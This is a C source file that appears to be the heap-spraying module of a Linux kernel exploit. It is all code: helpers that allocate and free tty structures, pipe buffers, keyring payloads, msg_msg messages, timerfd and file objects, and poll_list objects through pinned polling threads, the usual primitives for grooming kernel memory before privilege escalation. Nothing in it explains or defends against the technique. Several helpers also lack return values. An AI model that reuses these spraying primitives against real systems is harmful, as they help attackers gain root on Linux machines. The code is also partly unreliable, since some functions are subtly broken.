#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/keyctl.h>
#include <sys/syscall.h>
#include <stdbool.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <time.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <unistd.h>
#include "spray.h"
#include "../util/util.h"

int pipes[0x1000][0x02];
int qids[0x1000];
int keys[0x1000];
int seq_ops[0x10000];
int ptmx[0x1000];
int fds[0x1000];
pthread_t poll_tids[0x1000];
int n_keys;

static int poll_threads;
static pthread_mutex_t poll_mutex = PTHREAD_MUTEX_INITIALIZER;

void alloc_tty(int i) {
    ptmx[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    if (ptmx[i] < 0) {
        errExit("[X] alloc_tty");
    }
}

void free_tty(int i) {
    if (close(ptmx[i]) < 0) {
        errExit("[X] free tty");
    }
}

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        errExit("alloc_pipe_buf");
        return;
    }
}

void release_pipe_buf(int i)
{
    if (close(pipes[i][0]) < 0) {
        errExit("release_pipe_buf");
    }

    if (close(pipes[i][1]) < 0) {
        errExit("release_pipe_buf");
    }
}

static long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    long ret = syscall(__NR_add_key, type, description, payload, plen, ringid);
    if (ret < 0) {
        errExit("add_key");
    }
}

long free_key(key_serial_t key) {
    long ret = keyctl(KEYCTL_REVOKE, key, 0, 0, 0);

    if (ret < 0) {
        errExit("keyctl revoke");
    }

    ret = keyctl(KEYCTL_UNLINK, key, KEY_SPEC_PROCESS_KEYRING, 0, 0);

    if (ret < 0) {
        errExit("keyctl unlink");
    }
}

int get_key(int i, char* buf, size_t sz) {
    long ret = keyctl(KEYCTL_READ, keys[i], buf, sz, 0);
    if (ret < 0) {
        errExit("keyctl read");
    }
}

void alloc_key(int id, char *buf, size_t size)
{
    char desc[0x400] = { 0 };
    char payload[0x1000] = {0};
    int key;

    size -= sizeof(struct user_key_payload);

    sprintf(desc, "payload_%d", id);

    if (!buf) {
        memset(payload, 0x41, size);
    }
    else {
        memcpy(payload, buf, size);
    }

    key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);

    if (key < 0)
	{
        errExit("add_key");
	}

    keys[id] = key;
}

void alloc_qid(int i) {
    qids[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qids[i] < 0) {
        errExit("[X] msgget");
    }
}

void send_msg(int qid, int c, int size, long type)
{
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SZ) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf
    {
        long mtype;
        char mtext[size - off];
    } msg;

    if (!type) {
        msg.mtype = 0xffff;
    }
    else {
        msg.mtype = type;
    }

    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
    {
        errExit("msgsnd");
    }
}

void send_msg_payload(int qid, char* buf, int size, long type)
{
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SZ) {
        off += sizeof(msg_msg_seg_t);
    }

    struct msgbuf
    {
        long mtype;
        char mtext[size - off];
    } msg;

    memcpy(msg.mtext, buf, sizeof(msg.mtext));

    if (!type) {
        msg.mtype = 0xffff;
    }
    else {
        msg.mtype = type;
    }

    if (msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0)
    {
        errExit("msgsnd");
    }
}

long recv_msg(int qid, void* data, int size, long type, bool copy)
{
    int off = sizeof(msg_msg_t);
    if (size > PAGE_SZ) {
        off += sizeof(msg_msg_seg_t);
    }
    int ret;
    struct msg_buf
    {
        long mtype;
        char mtext[size - off];
    } msg;

    if (copy) {
        ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_COPY);
    }
    else {
        ret = msgrcv(qid, &msg, size - off, type, IPC_NOWAIT | MSG_NOERROR);
    }

    memcpy(data, msg.mtext, sizeof(msg.mtext));

    if (ret < 0) {
        errExit("msgrcv");
    }

    return msg.mtype;
}

int create_timer(bool leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

void init_fd(int i)
{
    fds[i] = open("/etc/passwd", O_RDONLY);

    if (fds[i] < 1)
    {
        errExit("[X] init_fd()");
    }
}

static int randint(int min, int max)
{
    return min + (rand() % (max - min));
}

unsigned poll_fds_to_alloc(size_t sz)
{
    // stuff allocated on stack (inside stack_pps buf)
    unsigned to_alloc = (STACK_PPS_SZ - sizeof(poll_list_t)) / sizeof(struct pollfd);

    // subtract size needed for poll_list struct
    if (sz % PAGE_SZ == 0) {
        sz -= sz / PAGE_SZ * sizeof(poll_list_t);
    }
    else {
        sz -= (sz / PAGE_SZ + 1) * sizeof(poll_list_t);
    }

    to_alloc += sz / sizeof(struct pollfd);

    return to_alloc;
}

void* spray_poll_list(void* args)
{
    thread_args_t *ta = (thread_args_t *)args;
    int ret;

    struct pollfd *pollers = calloc(ta->amt, sizeof(struct pollfd));

    for (int i = 0; i < ta->amt; i++) {
        pollers[i].fd = ta->fd_read;
        pollers[i].events = POLLERR;
    }

    assign_thread_to_core(0x0);

    pthread_mutex_lock(&poll_mutex);
    poll_threads++;
    pthread_mutex_unlock(&poll_mutex);

    ret = poll(pollers, ta->amt, ta->timeout);
    if (ret < 0) {
        errExit("poll");
    }

    assign_thread_to_core(randint(0x1, 0x3));

    if (ta->suspend) {
        pthread_mutex_lock(&poll_mutex);
        poll_threads--;
        pthread_mutex_unlock(&poll_mutex);

        while (1) { };
    }

    return NULL;
}

void create_poll_thread(int i, thread_args_t *args)
{
    int ret;

    ret = pthread_create(&poll_tids[i], 0, spray_poll_list, (void *)args);
    if (ret != 0) {
        errExit("pthread_create");
    }
}

void join_poll_threads(void)
{
    int ret;
    for (int i = 0; i < poll_threads; i++) {
        ret = pthread_join(poll_tids[i], NULL);

        if (ret < 0) {
            errExit("pthread_join");
        }
        open("/proc/self/stat", O_RDONLY);
    }
    poll_threads = 0x0;
}
